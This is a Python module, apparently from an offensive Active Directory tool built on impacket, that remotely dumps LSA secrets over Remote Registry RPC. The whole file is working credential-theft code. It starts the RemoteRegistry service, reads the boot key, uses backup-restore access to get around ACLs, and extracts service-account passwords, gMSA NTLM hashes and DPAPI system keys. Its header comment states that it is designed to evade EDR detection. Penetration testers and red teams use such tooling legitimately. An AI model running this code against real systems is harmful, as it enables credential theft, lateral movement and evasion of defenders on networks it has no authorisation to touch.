# Registry-only LSA secret extraction.
#
# Uses impacket's regsecrets module to extract LSA secrets via Remote
# Registry RPC (REG_OPTION_BACKUP_RESTORE). This approach reads secrets
# directly from the SECURITY registry hive without saving temp files to
# disk, eliminating the primary EDR detection vector of traditional
# secretsdump.
#
# Network footprint: \pipe\svcctl (start RemoteRegistry) + \pipe\winreg
# (registry queries). No files written to ADMIN$ or C$.
#
# Extracts:
#   - _SC_<ServiceName> secrets → service account passwords
#   - _SC_GMSA_* secrets → gMSA NTLM hashes (via MSDS_MANAGEDPASSWORD_BLOB)
#   - DPAPI_SYSTEM → dpapi_machinekey + dpapi_userkey (for task DPAPI decryption)

import binascii
import contextlib
from dataclasses import dataclass, field
from typing import Any, List, Optional, Set

from impacket.structure import Structure

from ..utils.logging import debug as log_debug
from ..utils.logging import good, info, warn

# ---------------------------------------------------------------------------
# gMSA managed password blob parser (MS-ADTS 3.1.1.3.6.7)
# ---------------------------------------------------------------------------

class MSDS_MANAGEDPASSWORD_BLOB(Structure):  # noqa: N801 — matches MS-ADTS naming
    """Parser for msDS-ManagedPassword attribute blob.

    Same structure whether read from LDAP or from LSA secrets.
    The CurrentPassword field contains the raw UTF-16LE password
    bytes from which the NTLM hash is derived.
    """

    structure = (
        ("Version", "<H"),
        ("Reserved", "<H"),
        ("Length", "<L"),
        ("CurrentPasswordOffset", "<H"),
        ("PreviousPasswordOffset", "<H"),
        ("QueryPasswordIntervalOffset", "<H"),
        ("UnchangedPasswordIntervalOffset", "<H"),
        ("CurrentPassword", ":"),
        ("PreviousPassword", ":"),
        ("QueryPasswordInterval", ":"),
        ("UnchangedPasswordInterval", ":"),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data=data)

    def fromString(self, data):
        Structure.fromString(self, data)
        end = self["QueryPasswordIntervalOffset"] if self["PreviousPasswordOffset"] == 0 else self["PreviousPasswordOffset"]
        self["CurrentPassword"] = self.rawData[self["CurrentPasswordOffset"]:][:end - self["CurrentPasswordOffset"]]
        if self["PreviousPasswordOffset"] != 0:
            self["PreviousPassword"] = self.rawData[self["PreviousPasswordOffset"]:][:self["QueryPasswordIntervalOffset"] - self["PreviousPasswordOffset"]]
        self["QueryPasswordInterval"] = self.rawData[self["QueryPasswordIntervalOffset"]:][:self["UnchangedPasswordIntervalOffset"] - self["QueryPasswordIntervalOffset"]]
        self["UnchangedPasswordInterval"] = self.rawData[self["UnchangedPasswordIntervalOffset"]:]


# The fixed GUID used in _SC_GMSA_ LSA secret key names
_GMSA_LSA_GUID = "84A78B8C-56EE-465b-8496-FFB35A1B52A7"


def _parse_gmsa_ntlm_from_lsa(secret_str: str) -> Optional[tuple]:
    """Parse a _SC_GMSA_ LSA secret string into (gmsa_id, ntlm_hash).

    The secret format from regsecrets callback is:
        _SC_GMSA_{GUID}_<HMAC>:<hex_blob>

    The hex blob is a MSDS_MANAGEDPASSWORD_BLOB. We extract
    CurrentPassword[:-2] (strip null terminator) and compute MD4 → NTLM.

    Returns:
        Tuple of (gmsa_id_hex, ntlm_hash_hex) or None on failure.
    """
    try:
        from Cryptodome.Hash import MD4

        # Extract the HMAC ID and hex data from the secret string
        # Format: "_SC_GMSA_{GUID}_<HMAC>:<hex_data>"
        parts = secret_str.split("_")
        # parts[4] is "<HMAC>:<hex>" — the HMAC + colon + blob data
        hmac_and_data = parts[4]
        gmsa_id, hex_data = hmac_and_data.split(":", 1)

        data = bytes.fromhex(hex_data)
        blob = MSDS_MANAGEDPASSWORD_BLOB()
        blob.fromString(data)

        # CurrentPassword is UTF-16LE with a null terminator — strip last 2 bytes
        current_password = blob["CurrentPassword"][:-2]

        # Compute NTLM hash (MD4 of the raw password bytes)
        ntlm_hash = MD4.new()
        ntlm_hash.update(current_password)
        return gmsa_id, binascii.hexlify(ntlm_hash.digest()).decode("utf-8")

    except Exception as e:
        log_debug(f"Failed to parse gMSA secret: {e}")
        return None


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------


@dataclass
class ServiceCredential:
    """A decrypted service credential from LSA secrets."""

    service_name: str
    account: str
    password: str
    lsa_secret_name: str  # _SC_<ServiceName>
    is_gmsa: bool = False  # True if extracted from _SC_GMSA_ key


@dataclass
class GMSACredential:
    """A gMSA credential extracted from LSA secrets."""

    gmsa_id: str  # HMAC-SHA256 hex identifier
    ntlm_hash: str  # NT hash hex


@dataclass
class LSAExtractionResult:
    """Complete result from LSA secret extraction."""

    service_credentials: List[ServiceCredential] = field(default_factory=list)
    gmsa_credentials: List[GMSACredential] = field(default_factory=list)
    dpapi_userkey: Optional[str] = None  # hex string, e.g. "0x1a2b3c..."
    dpapi_machinekey: Optional[str] = None  # hex string
    raw_secrets: List[str] = field(default_factory=list)  # all captured secret strings


def extract_lsa_secrets(
    smb: Any,
    host: str,
    service_names: Optional[Set[str]] = None,
    kerberos: bool = False,
    dc_host: Optional[str] = None,
) -> LSAExtractionResult:
    """
    Extract LSA secrets via registry-only approach (no disk writes).

    Uses impacket's regsecrets module which reads the SECURITY registry
    hive directly via Remote Registry RPC with REG_OPTION_BACKUP_RESTORE
    to bypass ACLs. The RemoteRegistry service is started if needed and
    restored to its original state afterward.

    Returns both service credentials (_SC_* secrets) and DPAPI system
    keys (DPAPI_SYSTEM secret) in a single extraction pass.

    Args:
        smb: Authenticated SMBConnection
        host: Target hostname (for logging)
        service_names: Set of service names to match _SC_* secrets against
        kerberos: Whether Kerberos auth is being used
        dc_host: DC hostname for Kerberos

    Returns:
        LSAExtractionResult with service credentials and DPAPI keys
    """
    from impacket.examples.regsecrets import LSASecrets, RemoteOperations

    remote_ops = None
    lsa_secrets = None
    result = LSAExtractionResult()
    captured: List[tuple] = []

    def _callback(secret_type, secret: str) -> None:
        """Capture all LSA secrets via callback."""
        captured.append((secret_type, secret))

    try:
        info(f"{host}: Starting registry-only LSA extraction (no disk writes)...")

        # Initialize RemoteOperations — registry-only, no hive saves
        remote_ops = RemoteOperations(smb, kerberos, kdcHost=dc_host)
        remote_ops.enableRegistry()
        log_debug(f"{host}: RemoteRegistry enabled for LSA extraction")

        # Extract boot key from SYSTEM registry via remote registry queries
        boot_key = remote_ops.getBootKey()
        log_debug(f"{host}: Boot key extracted from SYSTEM registry")

        # Decrypt LSA secrets from SECURITY registry — all via RPC, no files
        lsa_secrets = LSASecrets(
            boot_key,
            remoteOps=remote_ops,
            perSecretCallback=_callback,
        )
        lsa_secrets.dumpSecrets()
        log_debug(f"{host}: LSA secrets extracted ({len(captured)} entries)")

        # Parse captured secrets
        for _secret_type, secret_str in captured:
            if not secret_str:
                continue

            result.raw_secrets.append(secret_str)

            # Parse DPAPI_SYSTEM secret
            if "dpapi_userkey:" in secret_str:
                for line in secret_str.split("\n"):
                    line = line.strip()
                    if line.startswith("dpapi_userkey:"):
                        result.dpapi_userkey = line.split(":", 1)[1]
                        log_debug(f"{host}: Captured DPAPI userkey")
                    elif line.startswith("dpapi_machinekey:"):
                        result.dpapi_machinekey = line.split(":", 1)[1]
                        log_debug(f"{host}: Captured DPAPI machinekey")
                continue

            # Parse _SC_GMSA_ secrets (gMSA managed passwords)
            if f"_SC_GMSA_{{{_GMSA_LSA_GUID}}}" in secret_str:
                gmsa_result = _parse_gmsa_ntlm_from_lsa(secret_str)
                if gmsa_result:
                    gmsa_id, ntlm_hash = gmsa_result
                    result.gmsa_credentials.append(GMSACredential(
                        gmsa_id=gmsa_id,
                        ntlm_hash=ntlm_hash,
                    ))
                    log_debug(f"{host}: Captured gMSA credential (NTLM hash) for ID {gmsa_id[:16]}...")
                continue

            # Parse _SC_GMSA_DPAPI_ secrets (skip — these are the DPAPI-wrapped version)
            if "_SC_GMSA_DPAPI_" in secret_str:
                continue

            # Parse _SC_* service credentials (format: "account:password")
            if ":" not in secret_str:
                continue

            account, password = secret_str.split(":", 1)
            if not password or not account:
                continue

            # Skip non-credential secrets (machine account hashes, etc.)
            if account.startswith("$MACHINE.ACC") or account.startswith("ASPNET"):
                continue

            result.service_credentials.append(ServiceCredential(
                service_name="",  # Will be matched below
                account=account,
                password=password,
                lsa_secret_name="",
            ))

        # Match credentials to service names via SCM lookup
        if service_names and hasattr(remote_ops, "getServiceAccount"):
            matched: List[ServiceCredential] = []
            for svc_name in service_names:
                try:
                    svc_account = remote_ops.getServiceAccount(svc_name)
                except Exception:
                    svc_account = None

                if svc_account:
                    for cred in result.service_credentials:
                        cred_user = cred.account.split("\\")[-1].lower() if "\\" in cred.account else cred.account.lower()
                        svc_user = svc_account.split("\\")[-1].lower() if "\\" in svc_account else svc_account.lower()
                        if cred_user == svc_user or cred.account == "(Unknown User)":
                            matched.append(ServiceCredential(
                                service_name=svc_name,
                                account=svc_account,
                                password=cred.password,
                                lsa_secret_name=f"_SC_{svc_name}",
                            ))
                            break

            if matched:
                result.service_credentials = matched

        # Report results
        if result.service_credentials:
            good(f"{host}: Extracted {len(result.service_credentials)} service credential(s)")
        if result.gmsa_credentials:
            good(f"{host}: Extracted {len(result.gmsa_credentials)} gMSA NTLM hash(es) from LSA secrets")
        if result.dpapi_userkey:
            good(f"{host}: Extracted DPAPI system key (auto-feed for task credential decryption)")
        if not result.service_credentials and not result.gmsa_credentials and not result.dpapi_userkey:
            info(f"{host}: No service credentials, gMSA hashes, or DPAPI keys found in LSA secrets")

        return result

    except Exception as e:
        warn(f"{host}: LSA extraction failed: {e}")
        log_debug(f"{host}: LSA extraction error: {type(e).__name__}: {e}")
        return result

    finally:
        if lsa_secrets:
            with contextlib.suppress(Exception):
                lsa_secrets.finish()
        if remote_ops:
            with contextlib.suppress(Exception):
                remote_ops.finish()
        log_debug(f"{host}: LSA extraction cleanup complete")


# Legacy alias for backwards compatibility with Phase 5 code
def extract_service_credentials(
    smb: Any,
    host: str,
    service_names: Optional[Set[str]] = None,
    kerberos: bool = False,
    dc_host: Optional[str] = None,
) -> List[ServiceCredential]:
    """Extract service credentials only (legacy wrapper)."""
    result = extract_lsa_secrets(smb, host, service_names, kerberos, dc_host)
    return result.service_credentials
